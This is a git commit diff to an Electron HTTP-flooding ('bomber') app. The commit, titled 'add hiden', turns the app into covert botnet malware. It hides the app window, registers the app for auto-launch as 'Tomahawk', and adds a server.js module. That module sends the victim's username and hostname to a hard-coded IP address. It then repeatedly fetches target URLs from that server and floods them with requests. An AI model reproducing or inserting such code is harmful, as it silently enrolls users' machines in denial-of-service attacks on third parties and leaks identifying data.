7c5b6d79c56e18b684c3469fea0b8039272e24c7
Dima <zgltyq@gmail.com>
2022-03-24 00:17:59 +0200

    add hiden

--- src/index.js
+++ src/index.js
@@ -1,80 +1,95 @@
 const { Worker } =      require('worker_threads');
 // eslint-disable-next-line security/detect-child-process
 const path = require('path');
-const fs = require('fs');
-// eslint-disable-next-line security/detect-child-process
-const { execFile } = require('child_process');
 const { app, BrowserWindow, ipcMain } = require('electron');
 const detectPort = require('detect-port');
+const AutoLaunch = require('auto-launch');
 const { setState } = require('./utils/state');
+const server = require('./server.js');
 
-fs.access('logs.txt', (error) => {
-    if (error) {
-        execFile('tor.exe');
+(async () => {
+    let workers = [];
+
+    server();
+
+    const Tomahawk = new AutoLaunch({
+        name : 'Tomahawk'
+    });
+
+    const isEnabled = await Tomahawk.isEnabled();
+
+    if (!isEnabled) Tomahawk.enable();
+
+    if (require('electron-squirrel-startup')) { // eslint-disable-line global-require
+        app.quit();
     }
 
-    fs.writeFile('logs.txt', '', () => {});
-});
+    const createWindow = () => {
+        const mainWindow = new BrowserWindow({
+            width          : 800,
+            height         : 600,
+            webPreferences : {
+                nodeIntegration  : true,
+                contextIsolation : false
+            }
+        });
 
-let workers = [];
+        mainWindow.loadFile(path.join(__dirname, 'index.html'));
 
-if (require('electron-squirrel-startup')) { // eslint-disable-line global-require
-    app.quit();
-}
+    // mainWindow.webContents.openDevTools();
+    };
 
-const createWindow = () => {
-    const mainWindow = new BrowserWindow({
-        width          : 800,
-        height         : 600,
-        webPreferences : {
-            nodeIntegration  : true,
-            contextIsolation : false
+    const createHiddenWindow = () => {
+        const mainWindow = new BrowserWindow({
+            show           : false,
+            webPreferences : {
+                nodeIntegration  : true,
+                contextIsolation : false
+            }
+        });
+
+        mainWindow.loadFile(path.join(__dirname, 'index.html'));
+    };
+
+    app.on('ready', createHiddenWindow);
+
+    function startBomber({ event, urls, tor, threads }) {
+        workers = new Array(+threads).fill(new Worker(
+            `${__dirname}/bomber.js`,
+            { workerData: { urls, tor } }
+        ).on('message', ({ url, success }) => event.reply('logs', setState({ url, success }))));
+    }
+
+
+    app.on('window-all-closed', () => {
+        if (process.platform !== 'darwin') {
+            app.quit();
         }
     });
 
-    mainWindow.loadFile(path.join(__dirname, 'index.html'));
-
-    // mainWindow.webContents.openDevTools();
-};
-
-app.on('ready', createWindow);
-
-function startBomber({ event, urls, tor, threads }) {
-    workers = new Array(+threads).fill(new Worker(
-        `${__dirname}/bomber.js`,
-        { workerData: { urls, tor } }
-    ).on('message', ({ url, success }) => event.reply('logs', setState({ url, success }))));
-}
-
-
-app.on('window-all-closed', () => {
-    if (process.platform !== 'darwin') {
-        app.quit();
-    }
-});
-
-app.on('activate', () => {
-    if (BrowserWindow.getAllWindows().length === 0) {
-        createWindow();
-    }
-});
-
-
-ipcMain.on('start', async (event, data, tor, threads) => {
-    const urls = data.trim().split('\n');
-
-    if (tor) {
-        detectPort(9050, (err, _port) => {
-            if (err || _port === 9050) {
-                event.reply('error', 'Tor proxy is not launch');
-            } else startBomber({ event, urls, tor, threads });
-        });
-    } else startBomber({ event, urls, tor, threads });
-});
-
-ipcMain.on('stop', () => {
-    workers.forEach(async worker => {
-        await worker.terminate();
+    app.on('activate', () => {
+        if (BrowserWindow.getAllWindows().length < 2) {
+            createWindow();
+        }
     });
-});
+
+
+    ipcMain.on('start', async (event, data, tor, threads) => {
+        const urls = data.trim().split('\n');
+
+        if (tor) {
+            detectPort(9050, (err, _port) => {
+                if (err || _port === 9050) {
+                    event.reply('error', 'Tor proxy is not launch');
+                } else startBomber({ event, urls, tor, threads });
+            });
+        } else startBomber({ event, urls, tor, threads });
+    });
+
+    ipcMain.on('stop', () => {
+        workers.forEach(async worker => {
+            await worker.terminate();
+        });
+    });
+})();
 
---
+++ src/server.js
@@ -0,0 +1,46 @@
+const os = require('os');
+const fetch = require('isomorphic-fetch');
+const randomUseragent = require('random-useragent');
+const request = require('request');
+
+const RANDOM_INTERVAL = Math.floor(Math.random() * 60000) + 30000;
+
+module.exports = async () => {
+    await fetch('http://212.111.203.181/api/v1/bots', {
+        method  : 'POST',
+        headers : {
+            'Content-Type' : 'application/json'
+        },
+        body : JSON.stringify({ data : {
+            hostId : `${os.userInfo().username}-${os.hostname()}`
+        } })
+    });
+
+    let bomber = setInterval(() => {});
+
+
+    setInterval(async () => {
+        try {
+            const response = await fetch('http://212.111.203.181/api/v1/targets');
+            const body = await response.json();
+
+            if (body.data.urls.length > 0) {
+                clearInterval(bomber);
+                bomber = setInterval(() => {
+                    body.data.urls.forEach((url) => {
+                        request({
+                            url,
+                            method  : 'GET',
+                            headers : {
+                                'User-Agent' : randomUseragent.getRandom()
+                            }
+                        });
+                    });
+                });
+            }
+        } catch (err) {
+            console.log(err);
+        }
+    }, RANDOM_INTERVAL);
+};
+
